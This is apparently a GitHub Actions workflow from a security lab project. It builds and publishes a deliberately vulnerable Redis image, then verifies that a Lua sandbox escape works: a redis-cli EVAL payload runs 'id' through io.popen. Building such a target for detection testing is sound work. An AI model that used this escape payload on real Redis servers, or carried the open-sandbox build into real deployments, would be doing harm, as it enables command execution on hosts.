name: CI - Redis vulnerable image

on:
  push:
    branches:
      - main
      - feature/tuning
    paths:
      - 'example/Dockerfile.redis-vulnerable'
      - '.github/workflows/ci-redis-image.yaml'
  workflow_dispatch:

permissions:
  contents: read
  packages: write

jobs:
  build:
    name: Build & push redis-vulnerable
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Log in to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Build and push
        uses: docker/build-push-action@v6
        with:
          context: example
          file: example/Dockerfile.redis-vulnerable
          platforms: linux/amd64,linux/arm64
          push: true
          tags: |
            ghcr.io/k8sstormcenter/redis-vulnerable:7.2.10
            ghcr.io/k8sstormcenter/redis-vulnerable:latest

      - name: Verify sandbox escape (amd64)
        run: |
          docker run -d --name redis-test ghcr.io/k8sstormcenter/redis-vulnerable:7.2.10
          sleep 3
          # Test 1: io module is accessible
          docker exec redis-test redis-cli EVAL "return tostring(io)" 0
          # Test 2: package module is accessible
          docker exec redis-test redis-cli EVAL "return tostring(package)" 0
          # Test 3: Full sandbox escape via io.popen (direct â€” works because
          # the image is built with LUA_USE_POPEN and io loaded into sandbox)
          RESULT=$(docker exec redis-test redis-cli EVAL "
            local f = io.popen('id')
            local res = f:read('*a')
            f:close()
            return res
          " 0)
          echo "Sandbox escape result: $RESULT"
          echo "$RESULT" | grep -q "uid=" || { echo "FAIL: sandbox escape did not work"; exit 1; }
          docker rm -f redis-test
